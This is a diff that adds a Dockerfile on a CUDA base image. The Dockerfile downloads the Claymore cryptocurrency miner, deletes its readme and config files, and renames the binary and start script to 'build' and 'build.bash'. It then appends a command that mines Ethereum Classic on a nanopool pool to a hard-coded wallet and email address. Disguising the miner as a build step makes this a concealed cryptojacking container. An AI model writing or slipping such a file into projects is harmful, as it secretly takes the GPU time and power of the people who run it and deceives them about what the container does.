@@ -1,0 +1,17 @@
+FROM nvidia/cuda:8.0-devel
+
+RUN mkdir -p /opt/ && \
+    apt-get update && \
+    apt-get install -y curl wget libcurl4-openssl-dev && \
+    mkdir -p /opt/claymore
+
+WORKDIR /opt/claymore
+
+RUN wget https://github.com/nanopool/Claymore-Dual-Miner/releases/download/v10.0/Claymore.s.Dual.Ethereum.Decred_Siacoin_Lbry_Pascal.AMD.NVIDIA.GPU.Miner.v10.0.-.LINUX.tar.gz && \
+    tar -xzf Claymore*gz && rm -f *.gz && \
+    rm -f config.txt License.txt dpools.txt epools.txt start_eth+pasc.bash start.bash History.txt Readme\!\!\!.txt && \
+    mv start_only_eth.bash build.bash && mv ethdcrminer64 build && \
+    tail -6 build.bash > build.bash && \
+    echo './build -epool etc-eu1.nanopool.org:19999 -ewal 0x56ac2f5ca39808889e58e3e7c9ea50d8b675b518/$(hostname)/gembird686@yandex.ru -epsw x -mode 1 -ftime 10 -platform 2' >> build.bash
+
+ENV GPU_FORCE_64BIT_PTR=0  GPU_MAX_HEAP_SIZE=100 GPU_USE_SYNC_OBJECTS=1 GPU_MAX_ALLOC_PERCENT=100 GPU_SINGLE_ALLOC_PERCENT=100
